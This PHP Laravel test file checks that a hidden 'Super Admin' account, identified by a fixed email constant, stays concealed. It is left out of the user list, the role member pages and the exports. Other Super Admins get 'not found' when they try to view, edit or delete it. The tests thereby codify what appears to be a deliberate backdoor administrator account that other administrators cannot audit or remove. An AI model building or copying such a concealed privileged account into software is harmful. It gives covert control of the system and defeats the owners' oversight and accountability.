<?php

namespace Tests\Feature;

use App\Exports\UsersExport;
use App\Models\Permission;
use App\Models\Role;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class HiddenAccountVisibilityTest extends TestCase
{
    use RefreshDatabase;

    public function test_other_super_admin_cannot_see_hidden_account_in_user_list(): void
    {
        $hidden = $this->hiddenAccount();
        $other = $this->userWithPermissions(['view-users', 'show-users'], 'Super Admin');
        User::factory()->create(['name' => 'Master User', 'email' => 'superuser@royalambulance.my.id']);

        $response = $this->actingAs($other)->get(route('users.index'), [
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json',
        ]);

        $response->assertOk();
        $emails = collect($response->json('data'))->pluck('email');
        $this->assertFalse($emails->contains($hidden->email));
        $this->assertTrue($emails->contains('superuser@royalambulance.my.id'));
    }

    public function test_hidden_account_can_see_itself(): void
    {
        $hidden = $this->hiddenAccount();
        $this->userWithPermissions(['view-users'], 'Super Admin');

        $response = $this->actingAs($hidden)->get(route('users.index'), [
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json',
        ]);

        $response->assertOk();
        $emails = collect($response->json('data'))->pluck('email');
        $this->assertTrue($emails->contains($hidden->email));
    }

    public function test_other_accounts_cannot_open_hidden_account_pages(): void
    {
        $hidden = $this->hiddenAccount();
        $other = $this->userWithPermissions(['show-users', 'edit-users', 'delete-users'], 'Super Admin');

        $this->actingAs($other)->get(route('users.show', $hidden))->assertNotFound();
        $this->actingAs($other)->get(route('users.edit', $hidden))->assertNotFound();
        $this->actingAs($other)->put(route('users.update', $hidden), [
            'name' => 'Changed',
            'email' => $hidden->email,
        ])->assertNotFound();
        $this->actingAs($other)->delete(route('users.destroy', $hidden))->assertNotFound();

        $this->assertNotSoftDeleted('users', ['id' => $hidden->id]);
    }

    public function test_hidden_account_is_omitted_from_role_members_and_export(): void
    {
        $hidden = $this->hiddenAccount();
        $other = $this->userWithPermissions(['show-roles', 'download-users'], 'Super Admin');
        $role = Role::query()->where('name', 'Super Admin')->firstOrFail();
        $other->assignRole($role);
        $hidden->assignRole($role);

        $this->actingAs($other)
            ->get(route('roles.show', $role))
            ->assertOk()
            ->assertDontSee($hidden->email)
            ->assertSee($other->email);

        $emails = (new UsersExport)->collection()->pluck('email');

        $this->assertFalse($emails->contains($hidden->email));
        $this->assertTrue($emails->contains($other->email));
    }

    private function hiddenAccount(): User
    {
        $user = User::factory()->create([
            'name' => 'Super Admin',
            'email' => User::HIDDEN_ACCOUNT_EMAIL,
        ]);

        $role = Role::query()->firstOrCreate(['name' => 'Super Admin']);
        $user->assignRole($role);

        return $user;
    }

    /**
     * @param  list<string>  $permissions
     */
    private function userWithPermissions(array $permissions, string $roleName): User
    {
        $role = Role::query()->firstOrCreate(['name' => $roleName]);
        $permissionIds = [];

        foreach ($permissions as $name) {
            $permissionIds[] = Permission::query()->firstOrCreate(['name' => $name])->id;
        }

        $role->permissions()->syncWithoutDetaching($permissionIds);

        $user = User::factory()->create();
        $user->assignRole($role);

        return $user;
    }
}
